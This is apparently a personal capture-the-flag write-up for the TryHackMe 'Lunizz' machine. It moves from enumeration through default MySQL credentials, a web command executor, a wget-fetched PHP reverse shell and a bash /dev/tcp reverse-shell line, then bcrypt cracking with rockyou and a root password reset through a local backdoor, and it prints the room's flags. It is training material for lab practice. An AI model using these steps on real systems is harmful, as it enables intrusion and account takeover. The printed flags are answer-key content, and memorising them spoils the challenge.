### Nmap

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3306/tcp open  mysql      MySQL 5.7.33-0ubuntu0.18.04.1
| ssl-cert: Subject: commonName=MySQL_Server_5.7.33_Auto_Generated_Server_Certificate
| Not valid before: 2021-02-11T23:12:30
|_Not valid after:  2031-02-09T23:12:30
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.33-0ubuntu0.18.04.1
|   Thread ID: 4
|   Capabilities flags: 65535
|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, InteractiveClient, Support41Auth, SupportsTransactions, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongPassword, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, SupportsCompression, SupportsLoadDataLocal, IgnoreSigpipes, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: }E1\x03!SSZ5\x7FA\x08jJ#[Y\x06o7
|_  Auth Plugin Name: mysql_native_password
|_ssl-date: TLS randomness does not represent time
4444/tcp open  tcpwrapped
5000/tcp open  upnp?
| fingerprint-strings: 
|   NULL: 
|     OpenSSH 5.1
|_    Unable to load config info from /usr/local/ssl/openssl.cnf
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
```

### Port 80

- Default apache 2 installation

- FFUF finds this
```
hidden                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 1109ms]
whatever                [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 159ms]
```

- /hidden - here we are able to upload certain image extension files

- /whatever  - here maybe some kind of command executer in place but no output is given
- Used [[How to check if ping on target system is running by pinging urself]] this method to see if our commands were working and it was not, maybe `Command Executer Mode :0` this on the webpage is a hint, we have to change value of this to `1`

### Port 4444

- This is available on the webpage `http://10.10.182.144:4444/``

```
Can you decode this for me?
cmFuZG9tcGFzc3dvcmQ=
Wrong Password
```

```
echo "cmFuZG9tcGFzc3dvcmQ=" | base64 -d
randompassword
```

### Mysql

- Used default mysql to connect with server and get info

```
─[✗]─[glack@parrot]─[~/Desktop/THM/lunizz]
└──╼ $mysql -h 10.10.182.144 -u root -p

```

tried all potential password like 
```
root
password
randompassword
admin
```

none worked

- Used the hint, and tried this `http://10.10.182.144:4444/password.txt`
and got this 
```
Can you decode this for me?
ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=
Wrong Password
```

```
echo "ZXh0cmVtZWhhcmRyb290cGFzc3dvcmQ=" | base64 -d
extremehardrootpassword
```

this was also not working 

- this also worked `http://10.10.182.144:4444/check.txt`
```
─[✗]─[glack@parrot]─[~/Desktop/THM/lunizz]
└──╼ $echo "cEBzc3dvcmQ=" | base64 -d
p@ssword
```

- also this `http://10.10.182.144:4444/anything.txt`

this page is generating random password in base64 format


- Used the ffuf command to look for something else 
```

┌─[glack@parrot]─[~/Desktop/THM/lunizz]
└──╼ $ffuf -u http://10.10.182.144/FUZZ.txt -w /usr/share/wordlists/small.txt:FUZZ

```

got a hit
`/instructions.txt`

```
Made By CTF_SCRIPTS_CAVE (not real)

Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

Done you can start using ctf script

#Notes
please do not use default creds (IT'S DANGEROUS) <<<<<<<<<---------------------------- READ THIS LINE PLEASE
```

- we are able to login to mysql as `(runcheck:CTF_script_cave_changeme)`

- Used the following commands in `mysql` shell
```
MySQL [(none)]> SHOW DATABASES;

MySQL [(none)]> use runornot;

MySQL [runornot]> SHOW TABLES;

MySQL [runornot]> SELECT * FROM runcheck;

SELECT * FROM USER_PRIVILEGES;

SELECT * FROM PARAMETERS;

SELECT * FROM TABLES;

```

- USed this command to change the value of `run` column
```
MySQL [runornot]> UPDATE runcheck SET run = 1;
```

- Now we can see that `http://10.10.182.144/whatever/` here the `Command Executer Mode :1` this is changed from 0 to 1

### Foothold


- Using [[How to check if ping on target system is running by pinging urself]] again to see if ping command is working
it is not

- But we are able to run commands on `http://10.10.182.144/whatever/index.php` and also get the output
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` 

- However not all commands are being run here

when running `cat index.php` we get 

```
prepare("SELECT run from runcheck;");
$result->execute();
$result = $result->fetch();
$run = $result['run'];
echo "Command Executer Mode :". $run;
echo "<br>";
if ($_SERVER['REQUEST_METHOD'] == "POST") {
        if ($run == 1) {
                system($_POST['cmd']);
        } 
        else {
                $cmd = $_POST['cmd'];
                echo htmlspecialchars($cmd);
        }
}
```

`ping -n 5 10.17.24.189` and `bash -i >& /dev/tcp/10.17.24.189/9999 0>&1` does not work

Here maybe we have to change the request method - tried this and got no response

- `cat config.php` does not give anything useful


- `ls -al /home` gives this
```
drwxr-xr-x  4 root  root  4096 Feb 28  2021 .
drwxr-xr-x 25 root  root  4096 Mar 25  2021 ..
drwxr-x---  4 adam  adam  4096 Feb 28  2021 adam
drwxr-x---  2 mason mason 4096 Feb 28  2021 mason
```


- We are able to download the `php reverse shell` using `
`wget`

```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.61.254 - - [03/Sep/2023 18:11:43] "GET /php-reverse-shell.php HTTP/1.1" 200 
```


```
wget http://10.17.24.189:8000/php-reverse-shell.php
```

- Found an unusual file at `/proct/pass/bcrypt_encryption.py`

contents are
```
import bcrypt
import base64

passw = "wewillROCKYOU".encode('ascii')
b64str = base64.b64encode(passw)
hashAndSalt = bcrypt.hashpw(b64str, bcrypt.gensalt())
print(hashAndSalt)

#hashAndSalt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
#bcrypt.checkpw()
```

`wewillROCKYOU` is the pass for `adam` because these are owned by him
`drwxr-xr-x   3 adam adam       4096 Feb 28  2021 proct`


- trying to ssh into the server was giving an error
```
┌─[✗]─[glack@parrot]─[~/Desktop/pentestmoneky_php_reverse_shell]
└──╼ $ssh -p 5000 adam@10.10.61.254
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.10.61.254 port 5000
```

- mysql asl o does not take this password for `adam` or `mason` 

- Now to get a shell from RCE what i did was

since other files were not writable, i downloaded the  php reverse shell in /tmp
```
cd /tmp && wget http://10.17.24.189:8000/php-reverse-shell.php
```

gave executable permissions

```
chmod +x /tmp/php-reverse-shell.php
```

and triggered the php

```
php /tmp/php-reverse-shell.php
```

and got a shell
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Priv Esc- User

- when trying to switch my user to `adam` using 
`adam:wewillROCKYOU` it gives authentication failure


- tried some other random things and got stuck here and used the writeup for hint


```
─[✗]─[glack@parrot]─[~/Desktop/THM/lunizz]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt for_hashcat 
```
this also does not works

- Now followed this and other writeup and used their python scripts to crack the `bcrypt` hash
refer [[brcypt - info and cracking]]

- In summary
```
#!/usr/bin/env python3

import bcrypt
import base64

salt = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.'
bcrypt_hash = b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'

with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
	for word in f.readlines():
		passw = word.strip().encode('ascii',      'ignore')
		b64str = base64.b64encode(passw)
		hashAndSalt = bcrypt.hashpw(b64str, salt)
		print('\r', end='') # Clear previous line
		print(f'[*] Cracking hash: {hashAndSalt}', end='')

		if bcrypt_hash == hashAndSalt:
			print('\n[+] Cracked!')
			print(f'[+] Before hashed: {passw}')
			print(f'[+] After hashed: {hashAndSalt}')
			exit()

```


used this python script to crack the hash and got this

```
─[glack@parrot]─[~/Desktop/THM/lunizz]
└──╼ $sudo python3 bcrypt_crack.py 
[*] Cracking hash: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
[+] Cracked!
[+] Before hashed: b'bowwow'
[+] After hashed: b'$2b$12$LJ3m4rzPGmuN1U/h0IO55.3h9WhI/A0Rcbchmvk10KWRMWe4me81e'
```


- we are able to switch user to adam using

`adam:bowwow`


```
$ id
id
uid=1000(adam) gid=1000(adam) groups=1000(adam)
```

### Priv Esc 2 

- We find a text in adam's home driectory

```
adam@lunizz:~/Desktop/.archive$ cat to_my_best_friend_adam.txt
cat to_my_best_friend_adam.txt
do you remember our place 
i love there it's soo calming
i will make that lights my password

--

https://www.google.com/maps/@68.5090469,27.481808,3a,75y,313.8h,103.6t/data=!3m6!1e1!3m4!1skJPO1zlKRtMAAAQZLDcQIQ!3e2!7i10000!8i5000

```

- used writeup here

- We are able to switch users to `mason` using
```
adam@lunizz:/$ su mason       
su mason
Password: northernlights
```

- and the flag
```
mason@lunizz:~$ cat user.txt
cat user.txt
thm{23cd53cbb37a37a74d4425b703d91883}
```

### Priv ESC - 3 root

- here i already had a hint of using 

`curl http://localhost:8080/`

- it is a root backdoor

```


*   Please Send Request (with "password" and "cmdtype")  *

-------------CMD TYPES-------------
lsla
reboot
passwd
```

- again used the writeup here


using `GET` requests does not work here
```
curl 'http://localhost:8080?password=northernlights&cmdtype=lsla'
```

using post now

```
curl -X POST 'http://localhost:8080' -d 'password=northernlights&cmdtype=lsla'
```

this is working

```
curl -X POST 'http://localhost:8080' -d 'password=northernlights&cmdtype=passwd'
```


we get `<br>Password Changed To :northernlights`

- we get root shell when switching to root with above password

```
root@lunizz:/home/mason# id
id
uid=0(root) gid=0(root) groups=0(root)
```


and the flag

```
root@lunizz:~# cat r00t.txt
cat r00t.txt
thm{ad23b9c63602960371b50c7a697265db}
```